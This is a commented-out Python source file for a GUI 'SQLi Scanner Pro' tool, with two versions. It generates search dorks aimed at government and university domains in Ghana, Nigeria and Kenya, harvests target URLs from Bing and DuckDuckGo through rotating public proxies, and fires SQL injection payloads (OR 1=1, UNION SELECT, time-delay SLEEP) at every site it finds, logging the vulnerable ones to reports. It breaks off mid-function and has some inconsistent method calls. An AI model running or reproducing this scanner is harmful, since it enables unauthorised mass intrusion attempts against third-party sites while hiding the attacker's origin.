#         try:
#             with open(CONFIG_FILE, "r") as f:
#                 config = json.load(f)
#                 self.working_proxies = set(config.get("working_proxies", []))
#                 self.logger.log(f"Loaded {len(self.working_proxies)} working proxies from config", "DEBUG", "PROXY")
#         except (FileNotFoundError, json.JSONDecodeError) as e:
#             self.logger.log(f"Config load error: {str(e)}", "DEBUG", "PROXY")
#             self.working_proxies = set()

#     def save_config(self):
#         config = {"working_proxies": list(self.working_proxies)}
#         try:
#             with open(CONFIG_FILE, "w") as f:
#                 json.dump(config, f)
#             self.logger.log("Saved proxy config", "DEBUG", "PROXY")
#         except Exception as e:
#             self.logger.log(f"Failed to save config: {str(e)}", "ERROR", "PROXY")

#     def refresh_proxies(self) -> int:
#         """Fetch fresh proxies from multiple sources with detailed logging"""
#         self.proxies = []
#         total_added = 0
        
#         for source in PROXY_SOURCES:
#             try:
#                 self.logger.log(f"Fetching proxies from: {source}", "DEBUG", "PROXY")
#                 response = requests.get(source, timeout=10)
                
#                 if response.status_code == 200:
#                     new_proxies = [p.strip() for p in response.text.splitlines() if p.strip()]
#                     self.proxies.extend(new_proxies)
#                     total_added += len(new_proxies)
#                     self.logger.log(f"Added {len(new_proxies)} proxies from {source}", "DEBUG", "PROXY")
#                 else:
#                     self.logger.log(f"Failed to fetch from {source} - Status: {response.status_code}", "WARNING", "PROXY")
#             except Exception as e:
#                 self.logger.log(f"Error fetching from {source}: {str(e)}", "ERROR", "PROXY")
        
#         self.last_refresh = time.time()
#         self.logger.log(f"Total proxies available: {len(self.proxies)}", "INFO", "PROXY")
#         return len(self.proxies)

#     def get_working_proxy(self) -> Optional[Dict[str, str]]:
#         """Get a working proxy with verbose testing output"""
#         self.logger.log("Acquiring working proxy...", "DEBUG", "PROXY")
        
#         # First try cached working proxies
#         for proxy in list(self.working_proxies):
#             proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
#             if self._test_proxy(proxy_dict):
#                 self.logger.log(f"Using cached working proxy: {proxy}", "DEBUG", "PROXY")
#                 return proxy_dict
#             else:
#                 self.working_proxies.remove(proxy)
#                 self.logger.log(f"Removed non-working proxy: {proxy}", "DEBUG", "PROXY")
        
#         # Test new proxies if needed
#         tested = 0
#         for proxy in self.proxies:
#             if proxy not in self.working_proxies:
#                 proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
#                 tested += 1
                
#                 self.logger.log(f"Testing proxy {tested}/{len(self.proxies)}: {proxy}", "DEBUG", "PROXY")
#                 if self._test_proxy(proxy_dict):
#                     self.working_proxies.add(proxy)
#                     self.save_config()
#                     self.logger.log(f"Found working proxy: {proxy}", "SUCCESS", "PROXY")
#                     return proxy_dict
                
#                 # Don't test all proxies if we're not in verbose mode
#                 if not VERBOSE and tested > 10:
#                     break
        
#         self.logger.log("No working proxies available", "WARNING", "PROXY")
#         return None

#     def _test_proxy(self, proxy_dict: Dict[str, str]) -> bool:
#         """Test proxy with detailed output"""
#         try:
#             start_time = time.time()
#             response = requests.get(self.test_url, proxies=proxy_dict, timeout=5)
#             latency = int((time.time() - start_time) * 1000)
            
#             if response.status_code == 200:
#                 self.logger.log(f"Proxy OK - Latency: {latency}ms - Response: {response.text[:100]}", "DEBUG", "PROXY")
#                 return True
#             else:
#                 self.logger.log(f"Proxy failed - Status: {response.status_code}", "DEBUG", "PROXY")
#                 return False
#         except Exception as e:
#             self.logger.log(f"Proxy test error: {str(e)}", "DEBUG", "PROXY")
#             return False

# class SQLiScannerGUI:
#     """Main GUI application with verbose SQLi scanning"""
#     def __init__(self, root):
#         self.root = root
#         self.root.title("Verbose SQLi Scanner Pro")
#         self.root.geometry("1200x900")
        
#         # Initialize verbose logger
#         self.logger = VerboseLogger(self.setup_ui())
#         self.logger.log("Application initialized", "INFO", "SYSTEM")
        
#         # Core components
#         self.scanning = False
#         self.current_scan_thread = None
#         self.proxy_manager = ProxyManager(self.logger)
#         self.dorks = []
        
#         # Load initial proxies
#         self.proxy_manager.refresh_proxies()
        
#     def setup_ui(self) -> tk.Text:
#         """Initialize the user interface with enhanced logging panel"""
#         # Main paned window for resizable panels
#         main_pane = ttk.PanedWindow(self.root, orient=tk.VERTICAL)
#         main_pane.pack(fill=tk.BOTH, expand=True)
        
#         # Log frame with clear button
#         log_frame = ttk.Frame(main_pane)
#         main_pane.add(log_frame, weight=1)
        
#         # Text widget for logging
#         log_text = tk.Text(
#             log_frame,
#             wrap=tk.WORD,
#             bg="#121212",
#             fg="#FFFFFF",
#             insertbackground="white",
#             font=("Consolas", 10),
#             padx=10,
#             pady=10
#         )
#         scrollbar = ttk.Scrollbar(log_frame, command=log_text.yview)
#         log_text.configure(yscrollcommand=scrollbar.set)
        
#         log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
#         scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
#         # Control panel
#         control_frame = ttk.Frame(main_pane)
#         main_pane.add(control_frame, weight=0)
        
#         # Control buttons
#         buttons = [
#             ("Generate Dorks", self.generate_dorks),
#             ("Load Dorks", self.load_dorks),
#             ("Start Scan", self.start_scan),
#             ("Stop Scan", self.stop_scan),
#             ("Export HTML", self.export_html),
#             ("Export PDF", self.export_pdf),
#             ("Refresh Proxies", self.refresh_proxies),
#             ("Clear Log", self.clear_log)
#         ]
        
#         for i, (text, cmd) in enumerate(buttons):
#             btn = ttk.Button(control_frame, text=text, command=cmd)
#             btn.grid(row=i//4, column=i%4, padx=5, pady=5, sticky="ew")
        
#         # Status bar
#         self.status_var = tk.StringVar(value="Ready")
#         status_bar = ttk.Label(
#             self.root,
#             textvariable=self.status_var,
#             relief=tk.SUNKEN,
#             anchor=tk.W
#         )
#         status_bar.pack(fill=tk.X)
        
#         return log_text
    
#     def clear_log(self):
#         """Clear the log window"""
#         self.logger.log("Log cleared", "INFO", "SYSTEM")
#         self.logger.text_widget.delete(1.0, tk.END)
    
#     def generate_dorks(self):
#         """Generate search dorks with verbose output"""
#         self.logger.log("Generating dorks...", "INFO", "DORKGEN")
        
#         # Common vulnerable parameters
#         params = ["id", "page", "cat", "product", "view", "item", "user", "account"]
#         extensions = ["php", "asp", "aspx", "jsp", "cfm"]
        
#         # Country specific TLDs
#         countries = {
#             "Ghana": [".edu.gh", ".gov.gh"],
#             "Nigeria": [".edu.ng", ".gov.ng"],
#             "Kenya": [".edu.ke", ".go.ke"]
#         }
        
#         self.dorks = []
#         generated = 0
        
#         # Generate basic dorks
#         for param in params:
#             for ext in extensions:
#                 self.dorks.append(f"inurl:{param}= filetype:{ext}")
#                 self.dorks.append(f"inurl:.{ext}?{param}=")
#                 generated += 2
#                 self.logger.log(f"Generated dork: inurl:{param}= filetype:{ext}", "DEBUG", "DORKGEN")
#                 self.logger.log(f"Generated dork: inurl:.{ext}?{param}=", "DEBUG", "DORKGEN")
        
#         # Generate country-specific dorks
#         for country, tlds in countries.items():
#             for tld in tlds:
#                 for param in params:
#                     self.dorks.append(f"site:{tld} inurl:{param}=")
#                     self.dorks.append(f"site:{tld} inurl:.php?{param}=")
#                     generated += 2
#                     self.logger.log(f"Generated country dork ({country}): site:{tld} inurl:{param}=", "DEBUG", "DORKGEN")
        
#         self.logger.log(f"Generated {generated} total dorks", "SUCCESS", "DORKGEN")
#         self.status_var.set(f"Dorks generated: {generated}")
    
#     def load_dorks(self):
#         """Load dorks from file with verbose output"""
#         file_path = filedialog.askopenfilename(
#             title="Select Dorks File",
#             filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
#         )
        
#         if file_path:
#             try:
#                 with open(file_path, "r") as f:
#                     self.dorks = [line.strip() for line in f if line.strip()]
                
#                 self.logger.log(f"Loaded {len(self.dorks)} dorks from {file_path}", "SUCCESS", "DORKLOAD")
#                 self.status_var.set(f"Loaded {len(self.dorks)} dorks")
                
#                 if VERBOSE:
#                     for i, dork in enumerate(self.dorks[:10]):  # Show first 10 in verbose mode
#                         self.logger.log(f"Dork {i+1}: {dork}", "DEBUG", "DORKLOAD")
#                     if len(self.dorks) > 10:
#                         self.logger.log(f"... and {len(self.dorks)-10} more", "DEBUG", "DORKLOAD")
#             except Exception as e:
#                 self.logger.log(f"Error loading dorks: {str(e)}", "ERROR", "DORKLOAD")
#                 messagebox.showerror("Error", f"Failed to load dorks: {str(e)}")
    
#     def start_scan(self):
#         """Start the scanning process with verbose initialization"""
#         if not self.dorks:
#             self.logger.log("No dorks loaded - cannot start scan", "ERROR", "SCAN")
#             messagebox.showwarning("Warning", "No dorks loaded. Generate or load dorks first.")
#             return
            
#         if self.scanning:
#             self.logger.log("Scan already running", "WARNING", "SCAN")
#             messagebox.showinfo("Info", "Scan is already running")
#             return
            
#         self.scanning = True
#         self.logger.log("Starting scan...", "INFO", "SCAN")
#         self.logger.log(f"Loaded {len(self.dorks)} dorks to process", "INFO", "SCAN")
#         self.logger.log(f"Current working proxies: {len(self.proxy_manager.working_proxies)}", "INFO", "SCAN")
        
#         # Clear previous results
#         open(RESULTS_FILE, "w").close()
#         self.logger.log("Cleared previous results file", "DEBUG", "SCAN")
        
#         # Start scan thread
#         self.current_scan_thread = threading.Thread(target=self.run_scan, daemon=True)
#         self.current_scan_thread.start()
        
#         self.status_var.set("Scanning in progress...")
    
#     def stop_scan(self):
#         """Stop the scan with confirmation logging"""
#         if self.scanning:
#             self.scanning = False
#             self.logger.log("Scan stop requested...", "WARNING", "SCAN")
#             self.status_var.set("Stopping scan...")
#         else:
#             self.logger.log("No active scan to stop", "INFO", "SCAN")
#             messagebox.showinfo("Info", "No scan is currently running")
    
#     def run_scan(self):
#         """Main scanning loop with detailed progress logging"""
#         try:
#             total_vulnerable = 0
#             total_tested = 0
            
#             for i, dork in enumerate(self.dorks):
#                 if not self.scanning:
#                     break
                    
#                 self.logger.log(f"\nProcessing dork {i+1}/{len(self.dorks)}: {dork}", "INFO", "SCAN")
#                 self.status_var.set(f"Processing dork {i+1}/{len(self.dorks)}...")
                
#                 # Search for URLs
#                 start_time = time.time()
#                 urls = self.hybrid_search(dork)
#                 search_time = time.time() - start_time
                
#                 if urls:
#                     self.logger.log(f"Found {len(urls)} potential targets in {search_time:.2f}s", "SUCCESS", "SCAN")
                    
#                     # Test the URLs
#                     start_test = time.time()
#                     vulnerable = self.test_urls(urls)
#                     test_time = time.time() - start_test
                    
#                     total_vulnerable += vulnerable
#                     total_tested += len(urls)
                    
#                     self.logger.log(
#                         f"Tested {len(urls)} URLs in {test_time:.2f}s - Found {vulnerable} vulnerable",
#                         "INFO", "SCAN"
#                     )
#                 else:
#                     self.logger.log("No targets found for this dork", "WARNING", "SCAN")
                
#                 # Delay between dorks
#                 delay = random.uniform(*REQUEST_DELAY)
#                 self.logger.log(f"Waiting {delay:.2f}s before next dork...", "DEBUG", "SCAN")
#                 time.sleep(delay)
            
#             # Scan completion summary
#             self.logger.log(
#                 f"\nScan completed. Tested {total_tested} URLs total. Found {total_vulnerable} vulnerable.",
#                 "SUCCESS" if total_vulnerable > 0 else "INFO",
#                 "SCAN"
#             )
#             self.status_var.set(
#                 f"Scan complete - {total_vulnerable} vulnerabilities found" if total_vulnerable > 0 
#                 else "Scan complete - no vulnerabilities found"
#             )
            
#         except Exception as e:
#             self.logger.log(f"Scan error: {str(e)}", "ERROR", "SCAN")
#             messagebox.showerror("Error", f"Scan failed: {str(e)}")
#         finally:
#             self.scanning = False
#             if self.current_scan_thread.is_alive():
#                 self.current_scan_thread.join()
    
#     def hybrid_search(self, dork: str) -> List[str]:
#         """Search using multiple engines with verbose output"""
#         self.logger.log(f"Initiating hybrid search for: {dork}", "DEBUG", "SEARCH")
        
#         urls = set()
#         engines = [
#             ("Bing", self.search_bing),
#             ("DuckDuckGo", self.search_duckduckgo)
#         ]
        
#         for engine_name, engine_func in engines:
#             if not self.scanning:
#                 break
                
#             self.logger.log(f"Searching with {engine_name}...", "INFO", "SEARCH")
#             try:
#                 start_time = time.time()
#                 results = engine_func(dork)
#                 search_time = time.time() - start_time
                
#                 new_urls = len(results) - len(urls.intersection(results))
#                 urls.update(results)
                
#                 self.logger.log(
#                     f"{engine_name} found {len(results)} URLs ({new_urls} new) in {search_time:.2f}s",
#                     "INFO", "SEARCH"
#                 )
                
#                 if VERBOSE and results:
#                     for url in results[:3]:  # Show first 3 URLs in verbose mode
#                         self.logger.log(f"Found URL: {url}", "DEBUG", "SEARCH")
#                     if len(results) > 3:
#                         self.logger.log(f"... and {len(results)-3} more", "DEBUG", "SEARCH")
                
#             except Exception as e:
#                 self.logger.log(f"{engine_name} search failed: {str(e)}", "ERROR", "SEARCH")
        
#         return list(urls)
    
#     def search_bing(self, dork: str, pages: int = 2) -> List[str]:
#         """Search Bing with detailed logging"""
#         urls = set()
#         base_url = "https://www.bing.com/search"
        
#         for page in range(pages):
#             if not self.scanning:
#                 break
                
#             query = {
#                 "q": dork,
#                 "first": page * 10
#             }
#             search_url = f"{base_url}?{urllib.parse.urlencode(query)}"
            
#             self.logger.log(f"Fetching Bing page {page+1}: {search_url}", "DEBUG", "BING")
            
#             try:
#                 proxy = self.proxy_manager.get_working_proxy()
#                 response = requests.get(
#                     search_url,
#                     headers=HEADERS,
#                     proxies=proxy,
#                     timeout=10
#                 )
                
#                 if response.status_code == 200:
#                     soup = BeautifulSoup(response.text, "html.parser")
#                     found = 0
                    
#                     for link in soup.find_all("a", href=True):
#                         url = link["href"]
#                         if self.is_potential_target(url):
#                             clean_url = self.clean_url(url)
#                             if clean_url not in urls:
#                                 urls.add(clean_url)
#                                 found += 1
#                                 if VERBOSE:
#                                     self.logger.log(f"New target found: {clean_url}", "DEBUG", "BING")
                    
#                     self.logger.log(f"Page {page+1}: Found {found} new targets", "INFO", "BING")
#                 else:
#                     self.logger.log(f"Bing returned status {response.status_code}", "WARNING", "BING")
                
#                 # Delay between pages
#                 delay = random.uniform(*REQUEST_DELAY)
#                 time.sleep(delay)
                
#             except Exception as e:
#                 self.logger.log(f"Bing search error: {str(e)}", "ERROR", "BING")
#                 continue
        
#         return list(urls)
    
#     def test_urls(self, urls: List[str]) -> int:
#         """Test URLs for SQLi with detailed progress reporting"""
#         vulnerable_count = 0
#         total_urls = len(urls)
        
#         self.logger.log(f"Beginning SQLi tests for {total_urls} URLs", "INFO", "TESTER")
        
#         with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
#             futures = {}
            
#             for i, url in enumerate(urls):
#                 if not self.scanning:
#                     break
                    
#                 futures[executor.submit(self.test_sql_injection, url)] = url
                
#                 # Progress update every 10 URLs
#                 if VERBOSE and i % 10 == 0 and i > 0:
#                     self.logger.log(f"Submitted {i}/{total_urls} URLs for testing", "DEBUG", "TESTER")
            
#             # Process completed tests
#             for i, future in enumerate(as_completed(futures)):
#                 if not self.scanning:
#                     executor.shutdown(wait=False)
#                     break
                    
#                 url = futures[future]
                
#                 try:
#                     result = future.result()
#                     if result:
#                         vulnerable_count += 1
#                         self.logger.log(f"Vulnerability confirmed: {url}", "SUCCESS", "TESTER")
#                     else:
#                         if VERBOSE:
#                             self.logger.log(f"Test completed: {url} - Not vulnerable", "DEBUG", "TESTER")
#                 except Exception as e:
#                     self.logger.log(f"Test failed for {url}: {str(e)}", "ERROR", "TESTER")
                
#                 # Progress update
#                 if (i + 1) % 10 == 0 or (i + 1) == len(urls):
#                     self.logger.log(
#                         f"Progress: {i+1}/{total_urls} tested - {vulnerable_count} vulnerable",
#                         "INFO", "TESTER"
#                     )
#                     self.status_var.set(
#                         f"Testing: {i+1}/{total_urls} - {vulnerable_count} vulns found"
#                     )
        
#         return vulnerable_count

#     def search_duckduckgo(self, dork: str, pages: int = 2) -> List[str]:
#         """Search DuckDuckGo with detailed logging"""
#         urls = set()
#         base_url = "https://html.duckduckgo.com/html/"
        
#         for page in range(pages):
#             if not self.scanning:
#                 break
                
#             query = {
#                 "q": dork,
#                 "s": page * 30,  # DuckDuckGo uses 's' for pagination
#                 "dc": str(page + 1)  # Some versions use 'dc' for page count
#             }
            
#             self.logger.log(f"Fetching DuckDuckGo page {page+1}", "DEBUG", "DDG")
            
#             try:
#                 proxy = self.proxy_manager.get_working_proxy()
#                 response = requests.post(
#                     base_url,
#                     data=query,
#                     headers=HEADERS,
#                     proxies=proxy,
#                     timeout=10
#                 )
                
#                 if response.status_code == 200:
#                     soup = BeautifulSoup(response.text, "html.parser")
#                     found = 0
                    
#                     # DuckDuckGo results are in <a> tags with class "result__url"
#                     for link in soup.find_all("a", class_="result__url"):
#                         url = link["href"]
#                         if url.startswith("//"):
#                             url = "https:" + url
#                         if self.is_potential_target(url):
#                             clean_url = self.clean_url(url)
#                             if clean_url not in urls:
#                                 urls.add(clean_url)
#                                 found += 1
#                                 if VERBOSE:
#                                     self.logger.log(f"New target found: {clean_url}", "DEBUG", "DDG")
                    
#                     self.logger.log(f"Page {page+1}: Found {found} new targets", "INFO", "DDG")
#                 else:
#                     self.logger.log(f"DuckDuckGo returned status {response.status_code}", "WARNING", "DDG")
                
#                 # Delay between pages
#                 delay = random.uniform(*REQUEST_DELAY)
#                 time.sleep(delay)
                
#             except Exception as e:
#                 self.logger.log(f"DuckDuckGo search error: {str(e)}", "ERROR", "DDG")
#                 continue
        
#         return list(urls)
    
#     def is_potential_target(self, url: str) -> bool:
#         """Check if URL looks like a potential SQLi target"""
#         # Skip non-HTTP URLs and common non-vulnerable paths
#         if not url.startswith(('http://', 'https://')):
#             return False
            
#         # Skip common static file extensions
#         static_extensions = ['.pdf', '.jpg', '.png', '.css', '.js', '.svg']
#         if any(url.lower().endswith(ext) for ext in static_extensions):
#             return False
            
#         # Look for common vulnerable patterns
#         vulnerable_patterns = ['?id=', '?page=', '?user=', '?cat=', '?product=']
#         return any(pattern in url.lower() for pattern in vulnerable_patterns)

#     def clean_url(self, url: str) -> str:
#         """Clean and normalize URL"""
#         # Remove fragments and common tracking parameters
#         url = url.split('#')[0]
#         for param in ['utm_', 'fbclid', 'gclid', 'sessionid']:
#             url = re.sub(f'[&?]{param}=[^&]*', '', url)
#         return url
    
#     def test_sql_injection(self, url: str) -> bool:
#         """Test a single URL for SQLi with detailed payload testing"""
#         if not self.scanning:
#             return False
            
#         self.logger.log(f"Testing URL: {url}", "DEBUG", "TESTER")
        
#         # Standard SQLi payloads
#         payloads = [
#             ("Single quote", "'"),
#             ("Double quote", "\""),
#             ("OR 1=1", "' OR '1'='1"),
#             ("OR 1=1 comment", "' OR 1=1--"),
#             ("OR 1=1 hash", "' OR 1=1#"),
#             ("Boolean blind", "' AND 1=CONVERT(int,@@version)--"),
#             ("Time delay", "' OR IF(1=1,SLEEP(5),0)--"),
#             ("Union test", "' UNION SELECT 1,2,3--")
#         ]
        
#         for name, payload in payloads:
#             if not self.scanning:
#                 return False
                
#             test_url = self.inject_payload(url, payload)
#             self.logger.log(f"Trying payload '{name}': {test_url}", "DEBUG", "TESTER")
            
#             try:
#                 proxy = self.proxy_manager.get_working_proxy()
#                 start_time = time.time()
#                 response = requests.get(
#                     test_url,
#                     headers=HEADERS,
#                     proxies=proxy,
#                     timeout=10
#                 )
#                 response_time = time.time() - start_time
                
#                 # Check for SQL errors
#                 if self.detect_sql_errors(response.text):
#                     self.logger.log(
#                         f"Potential SQLi found with payload '{name}' - Response time: {response_time:.2f}s",
#                         "SUCCESS", "TESTER"
#                     )
                    
#                     # Save the vulnerable URL with payload info
#                     with open(RESULTS_FILE, "a") as f:
#                         f.write(f"{url}\tPayload: {name} ({payload})\n")
                    
#                     return True
                
#                 # Check for time-based blind SQLi
#                 if "Time delay" in name and response_time > 4:
#                     self.logger.log(
#                         f"Potential time-based blind SQLi (delay {response_time:.2f}s)",
#                         "SUCCESS", "TESTER"
#                     )
#                     with open(RESULTS_FILE, "a") as f:
#                         f.write(f"{url}\tBlind SQLi (time delay) with payload: {payload}\n")
#                     return True
                
#                 # Small delay between payloads
#                 time.sleep(0.5)
                
#             except Exception as e:
#                 self.logger.log(f"Payload test failed: {str(e)}", "ERROR", "TESTER")
#                 continue
        
#         return False

#     # ... (rest of the methods remain similar but with added verbose logging)

#     def inject_payload(self, url: str, payload: str) -> str:
#         """Inject a payload into the URL parameters"""
#         if "?" in url:
#             base, params = url.split("?", 1)
#             param_pairs = params.split("&")
#             injected_params = []
            
#             for pair in param_pairs:
#                 if "=" in pair:
#                     key, value = pair.split("=", 1)
#                     injected_params.append(f"{key}={value}{payload}")
#                 else:
#                     injected_params.append(pair)
            
#             return f"{base}?{'&'.join(injected_params)}"
#         else:
#             return f"{url}?{payload}"
    
#     def detect_sql_errors(self, response_text: str) -> bool:
#         """Check response text for SQL error patterns"""
#         error_patterns = [
#             "sql syntax",
#             "mysql_fetch",
#             "ORA-",
#             "syntax error",
#             "unclosed quotation mark",
#             "quoted string not properly terminated",
#             "odbc microsoft access driver",
#             "sqlserver",
#             "mysql error",
#             "postgresql error",
#             "syntax error near",
#             "unexpected end of sql command",
#             "sql command not properly ended",
#             "warning: mysql",
#             "sqlite exception",
#             "pdoexception"
#         ]
        
#         text_lower = response_text.lower()
#         return any(error in text_lower for error in error_patterns)
    
#     def export_html(self):
#         """Export results to HTML report"""
#         try:
#             with open(RESULTS_FILE, "r") as f:
#                 results = [line.strip().split("\t") for line in f if line.strip()]
            
#             if not results:
#                 messagebox.showinfo("Info", "No results to export")
#                 return
                
#             html = """<!DOCTYPE html>
# <html lang="en">
# <head>
#     <meta charset="UTF-8">
#     <title>SQL Injection Scan Report</title>
#     <style>
#         body { font-family: Arial, sans-serif; margin: 20px; }
#         h1 { color: #333; }
#         table { border-collapse: collapse; width: 100%; }
#         th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
#         th { background-color: #f2f2f2; }
#         tr:nth-child(even) { background-color: #f9f9f9; }
#         .vulnerable { color: red; font-weight: bold; }
#     </style>
# </head>
# <body>
#     <h1>SQL Injection Scan Report</h1>
#     <p>Generated on {datetime}</p>
#     <table>
#         <tr>
#             <th>URL</th>
#             <th>Payload</th>
#             <th>Status</th>
#         </tr>
# """.format(datetime=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            
#             for result in results:
#                 url = result[0]
#                 payload = result[1] if len(result) > 1 else "N/A"
#                 html += f"""
#         <tr>
#             <td><a href="{url}" target="_blank">{url}</a></td>
#             <td>{payload}</td>
#             <td class="vulnerable">Vulnerable</td>
#         </tr>
# """
            
#             html += """
#     </table>
# </body>
# </html>
# """
#             with open(HTML_REPORT, "w") as f:
#                 f.write(html)
            
#             self.log_message(f"HTML report saved to {HTML_REPORT}", "success")
#             messagebox.showinfo("Success", f"HTML report saved to {HTML_REPORT}")
            
#         except Exception as e:
#             self.log_message(f"Error exporting HTML: {str(e)}", "error")
#             messagebox.showerror("Error", f"Failed to export HTML: {str(e)}")
    
#     def export_pdf(self):
#         """Export results to PDF report"""
#         try:
#             pdf = FPDF()
#             pdf.add_page()
#             pdf.set_font("Arial", size=12)
            
#             # Title
#             pdf.cell(200, 10, txt="SQL Injection Scan Report", ln=True, align="C")
#             pdf.ln(10)
            
#             # Date
#             pdf.set_font("", size=10)
#             pdf.cell(200, 10, txt=f"Generated on: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", ln=True)
#             pdf.ln(10)
            
#             # Results
#             pdf.set_font("", "B", size=12)
#             pdf.cell(200, 10, txt="Vulnerable URLs:", ln=True)
#             pdf.set_font("", size=10)
            
#             try:
#                 with open(RESULTS_FILE, "r") as f:
#                     for line in f:
#                         if line.strip():
#                             parts = line.strip().split("\t")
#                             url = parts[0]
#                             payload = parts[1] if len(parts) > 1 else ""
#                             pdf.multi_cell(0, 10, txt=f"URL: {url}\nPayload: {payload}\n", border=0)
#                             pdf.ln(2)
#             except FileNotFoundError:
#                 pdf.multi_cell(0, 10, txt="No results found", border=0)
            
#             # Save dialog
#             file_path = filedialog.asksaveasfilename(
#                 defaultextension=".pdf",
#                 filetypes=[("PDF Files", "*.pdf")],
#                 title="Save PDF Report"
#             )
            
#             if file_path:
#                 pdf.output(file_path)
#                 self.log_message(f"PDF report saved to {file_path}", "success")
#                 messagebox.showinfo("Success", f"PDF report saved to {file_path}")
                
#         except Exception as e:
#             self.log_message(f"Error exporting PDF: {str(e)}", "error")
#             messagebox.showerror("Error", f"Failed to export PDF: {str(e)}")
    
#     def refresh_proxies(self):
#         """Refresh the proxy list"""
#         count = self.proxy_manager.refresh_proxies()
#         self.log_message(f"Refreshed proxy list with {count} proxies", "success")
    
# if __name__ == "__main__":
#     root = tk.Tk()
#     app = SQLiScannerGUI(root)
#     root.mainloop()





# import requests
# import random
# import time
# import threading
# import tkinter as tk
# from tkinter import ttk, filedialog, messagebox
# from bs4 import BeautifulSoup
# from fpdf import FPDF
# from concurrent.futures import ThreadPoolExecutor, as_completed
# from typing import List, Dict, Optional, Set
# import datetime
# import json
# from pathlib import Path

# # Constants
# CONFIG_FILE = "config.json"
# HEADERS = {
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
# }
# PROXY_SOURCES = [
#     "https://www.proxy-list.download/api/v1/get?type=http",
#     "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http"
# ]
# RESULTS_FILE = "sqli_results.txt"
# HTML_REPORT = "sqli_report.html"
# MAX_WORKERS = 10
# REQUEST_DELAY = (1.0, 3.0)  # Random delay range between requests

# class ProxyManager:
#     """Handles proxy acquisition and rotation"""
#     def __init__(self):
#         self.proxies: List[str] = []
#         self.working_proxies: Set[str] = set()
#         self.last_refresh: Optional[float] = None
#         self.load_config()

#     def load_config(self):
#         try:
#             with open(CONFIG_FILE, "r") as f:
#                 config = json.load(f)
#                 self.working_proxies = set(config.get("working_proxies", []))
#         except (FileNotFoundError, json.JSONDecodeError):
#             self.working_proxies = set()

#     def save_config(self):
#         config = {"working_proxies": list(self.working_proxies)}
#         with open(CONFIG_FILE, "w") as f:
#             json.dump(config, f)

#     def refresh_proxies(self):
#         """Fetch fresh proxies from multiple sources"""
#         self.proxies = []
#         for source in PROXY_SOURCES:
#             try:
#                 response = requests.get(source, timeout=10)
#                 if response.status_code == 200:
#                     self.proxies.extend([p.strip() for p in response.text.splitlines() if p.strip()])
#             except requests.RequestException:
#                 continue
        
#         self.last_refresh = time.time()
#         return len(self.proxies)

#     def get_working_proxy(self) -> Optional[Dict[str, str]]:
#         """Returns a verified working proxy"""
#         # First try previously working proxies
#         for proxy in list(self.working_proxies):
#             proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
#             if self._test_proxy(proxy_dict):
#                 return proxy_dict
        
#         # Test new proxies if needed
#         for proxy in self.proxies:
#             if proxy not in self.working_proxies:
#                 proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
#                 if self._test_proxy(proxy_dict):
#                     self.working_proxies.add(proxy)
#                     self.save_config()
#                     return proxy_dict
        
#         return None

#     def _test_proxy(self, proxy_dict: Dict[str, str]) -> bool:
#         """Test if a proxy is working"""
#         try:
#             test_url = "https://httpbin.org/ip"
#             response = requests.get(test_url, proxies=proxy_dict, timeout=5)
#             return response.status_code == 200
#         except requests.RequestException:
#             return False

# class SQLiScannerGUI:
#     """Main GUI application for SQLi Scanner"""
#     def __init__(self, root):
#         self.root = root
#         self.root.title("AI-Driven SQLi Scanner Pro")
#         self.root.geometry("1000x800")
#         self.setup_ui()
        
#         self.scanning = False
#         self.proxy_manager = ProxyManager()
#         self.dorks: List[str] = []
#         self.current_scan_thread: Optional[threading.Thread] = None
        
#         # Load any saved proxies
#         self.proxy_manager.refresh_proxies()
        
#     def setup_ui(self):
#         """Initialize the user interface"""
#         # Configure styles
#         style = ttk.Style()
#         style.configure("TButton", padding=6)
#         style.configure("TFrame", padding=10)
        
#         # Main frame
#         main_frame = ttk.Frame(self.root)
#         main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
#         # Log area
#         self.log = tk.Text(main_frame, wrap="word", height=25, bg="#121212", fg="#00FF00",
#                           insertbackground="white", font=("Consolas", 10))
#         scrollbar = ttk.Scrollbar(main_frame, orient="vertical", command=self.log.yview)
#         self.log.configure(yscrollcommand=scrollbar.set)
        
#         self.log.grid(row=0, column=0, sticky="nsew", pady=(0, 10))
#         scrollbar.grid(row=0, column=1, sticky="ns")
        
#         # Control buttons frame
#         button_frame = ttk.Frame(main_frame)
#         button_frame.grid(row=1, column=0, columnspan=2, sticky="ew")
        
#         # Buttons
#         buttons = [
#             ("Generate Dorks", self.generate_dorks),
#             ("Load Dorks", self.load_dorks),
#             ("Start Scan", self.start_scan),
#             ("Stop Scan", self.stop_scan),
#             ("Export HTML", self.export_html),
#             ("Export PDF", self.export_pdf),
#             ("Refresh Proxies", self.refresh_proxies)
#         ]
        
#         for i, (text, command) in enumerate(buttons):
#             btn = ttk.Button(button_frame, text=text, command=command)
#             btn.grid(row=0, column=i, padx=5, sticky="ew")
        
#         # Status bar
#         self.status_var = tk.StringVar()
#         self.status_var.set("Ready")
#         status_bar = ttk.Label(main_frame, textvariable=self.status_var, relief="sunken")
#         status_bar.grid(row=2, column=0, columnspan=2, sticky="ew")
        
#         # Configure grid weights
#         main_frame.columnconfigure(0, weight=1)
#         main_frame.rowconfigure(0, weight=1)
        
#     def log_message(self, message: str, level: str = "info"):
#         """Log a message with timestamp and coloring"""
#         timestamp = datetime.datetime.now().strftime("%H:%M:%S")
#         level_colors = {
#             "info": "#FFFFFF",
#             "success": "#00FF00",
#             "warning": "#FFFF00",
#             "error": "#FF0000"
#         }
        
#         color = level_colors.get(level, "#FFFFFF")
#         self.log.insert("end", f"[{timestamp}] {message}\n", level)
#         self.log.tag_config(level, foreground=color)
#         self.log.see("end")
        
#     def generate_dorks(self):
#         """Generate search dorks targeting vulnerable URLs"""
#         self.dorks = []
        
